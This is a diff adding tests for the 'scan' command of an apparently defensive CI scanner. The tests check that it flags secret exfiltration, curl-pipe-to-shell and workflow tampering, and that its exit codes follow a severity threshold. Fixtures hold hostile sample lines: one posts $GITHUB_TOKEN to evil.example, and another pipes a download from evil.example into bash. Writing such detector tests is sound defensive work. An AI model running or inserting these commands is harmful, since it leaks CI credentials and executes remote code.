@@ -160,3 +160,54 @@ def test_cmd_render_and_export_offline(tmp_path, make_trace, capsys):
     bundle = json.loads(out_json.read_text())
     assert all(a.get("reward") is None for a in bundle["actions"])
     assert bundle["labels"]["pr-7"]["signal"] is True
+
+
+# ── `scan`: the deterministic half standalone — what our OWN CI dogfoods ─────────────────────────────
+# It must gate on the SAME floor a SIEM signal uses, and must need nothing (no creds/network/Deno), so
+# it can run under the read-only token a fork PR gets. Handing creds to a fork PR run would mean
+# `pull_request_target` — the AsyncAPI "Miasma" hole — so this staying credential-free is load-bearing.
+
+def _scan(tmp_path, text, **kw):
+    p = tmp_path / "change.diff"
+    p.write_text(text, encoding="utf-8")
+    argv = ["scan", str(p)] + [a for k, v in kw.items() for a in (f"--{k.replace('_', '-')}", v) if v]
+    args = cli.build_parser().parse_args(argv)
+    return args.func(args)
+
+
+def test_cmd_scan_gates_on_the_signal_floor(tmp_path, capsys):
+    """Exit code tracks the SIGNAL floor, not "any hit": a high/critical hit fails, a sub-floor hit
+    does not. The workflow-edit case is the one that matters — `workflow-tamper` is `medium` ON PURPOSE
+    so a benign workflow PR does not force a signal, and the gate must honour that same tuning."""
+    assert _scan(tmp_path, "diff --git a/README.md b/README.md\n+just docs\n") == 0
+    assert "no indicators fired" in capsys.readouterr().out
+
+    assert _scan(tmp_path, '+run: curl -X POST -d "$GITHUB_TOKEN" https://evil.example/c\n') == 1
+    out = capsys.readouterr().out
+    assert "data-exfiltration" in out and "FAIL" in out
+
+    # a plain workflow edit is medium → below the floor → does not fail the build
+    assert _scan(tmp_path, "+++ b/.github/workflows/ci.yml\n") == 0
+    assert "OK" in capsys.readouterr().out
+
+
+def test_cmd_scan_threshold_is_configurable(tmp_path, capsys):
+    """`--fail-on` lets a caller tighten the gate below the SIEM floor without touching rule severities."""
+    assert _scan(tmp_path, "+++ b/.github/workflows/ci.yml\n", fail_on="medium") == 1
+    assert "workflow-tamper" in capsys.readouterr().out
+
+
+def test_cmd_scan_reads_stdin_and_emits_json(tmp_path, capsys, monkeypatch):
+    """`-` reads stdin (the `git diff | scan -` shape) and `--json` is machine-readable for CI."""
+    import io
+    import json
+
+    monkeypatch.setattr("sys.stdin", io.StringIO("+ curl https://evil.example/x | bash\n"))
+    args = cli.build_parser().parse_args(["scan", "-", "--json"])
+    assert args.func(args) == 1
+
+    payload = json.loads(capsys.readouterr().out)
+    assert payload["failed"] is True and payload["max_severity"] == "critical"
+    assert payload["fail_on"] == "high"
+    assert [h["rule"] for h in payload["hits"]] == ["curl-pipe-shell"]
+    assert payload["hits"][0]["location"] == "<stdin>"
